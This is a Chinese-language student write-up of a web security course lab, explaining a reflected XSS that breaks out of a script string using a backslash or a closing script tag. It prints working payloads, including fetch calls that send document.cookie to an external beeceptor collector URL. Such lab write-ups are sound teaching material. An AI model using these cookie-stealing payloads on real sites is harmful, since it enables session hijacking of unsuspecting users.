# 2022 Computer Security HW10 Writeup - Web

* [HW10 github (Writeup and Payload)](https://github.com/fdff87554/Computer-Security-2022/tree/main/homework/Homework-10)

## Particles.js - Lab
* 這題是一個 XSS 的 Example，雖然畫面中沒有輸入匡，但是可以從 url 發現我們選擇的 theme 會被帶入 url 中，而且可以看一下 source code，可以看到 config.value 會被直接帶入 script 中，所以我們可以利用這個特性來做 XSS。
* 攻擊的 Source code 區段為下，
    ```javascript=
    <script>
    url.value = location; config.value = 'bubble'; fetch('/bubble.json').then(r => r.json()).then(json => {
        particlesJS("particles-js", json)
    })
    </script>
    ```
* 那先來考慮如何建構 XSS，在輸入的過程中我們可以發現 server side 有過濾 `'`，因此如果要跳脫 `<script>` 內部的文字內容，我們可以利用 `\` 來做跳脫，會發生什麼事情是今天 Javascript 中的 `config.value = '\'; fetch('/\').thenj(r => ...` 這段的 `'; fetch(` 會因為前面的 `'` 被反斜跳脫而變成字串，直到 `fetch` 本身的單引號為止，都被視為 `config.value` 的字串。
    > ![web-lab01-xss-example-with-backslash](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-1.png)
* 那要記得我們的資料會被同步在 `config.value='<input>'` 跟 `fetch('/<input>.json')` 這個區域，那我們已經知道到 `/` 之前的資料都會被反斜線變成字元了，因此可以想像一下在反斜線之前添加怎樣的字串來建構惡意的 payload。舉例來說 payload=`1;\` 可以讓 config.value 語句完全中斷，然後後面的部分我們可以直接隨便在串接起來。我們先嘗試建立一個合法的 JS 讓語句能回彈 alert()，payload=`1;alert(1);console.log({x://\`，可以看到 alert() 成功被觸發。
    > ![web-lab01-xss-example-with-backslash](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-2.png)
    > ![web-lab01-xss-example-with-backslash-alert](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-alert.png)
* 那今天我們的目標是去偷 cookie，一般來說可以用 `doument.cookie` 來取得，那我們試著把 cookie 混在一段 request 中丟出來取得，payload=`1;fetch("https://crazyfirelee.free.beeceptor.com?"+document.cookie);console.log({x://\`，可以看到我們的 cookie 成功被送出。**這邊要特別注意的是，在 url 中的 `+` 要用 `%2b` 代替**
    > ![web-lab01-xss-example-with-backslash-cookie](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-backslash-cookie.png)
* 那這邊除了用 `\` 反斜線來跳脫以外，講師還有提到另一個 JS 的特性就是不管在哪裡，只要看到 `<script>` 就會視為 JS Tag，因此假設我們今天不用反斜線而是用 `</script>` 來閉合這段 JS，就可以直接從後面建構新的 JS 區段了。因此回到最一開始，如果我們利用 `</script>` 作為跳脫，可以看到剛剛的 JS 區段被截斷而後半部直接被遺棄。
    > ![web-lab01-xss-example-with-script](https://raw.githubusercontent.com/fdff87554/Computer-Security-2022/main/images/web/week-02/web-lab01-xss-example-with-script.png)
* 但這邊還沒有成功實作出怎麼利用 `</script>` 建構 payload，等之後有成功會補上。
    > 嘗試了一下 `</script><script>fetch("https://crazyfirelee.free.beeceptor.com?"+document.cookie);</script>` 會在 enter 之後直接送兩次 fetch 出來，但在 report 的時候不會觸發，還沒理解為什麼。


---
###### tags: `CyberSec` `Writeup` `2022`

<style>
.navbar-brand::after { content: " × Crazyfire Lee"; }
</style>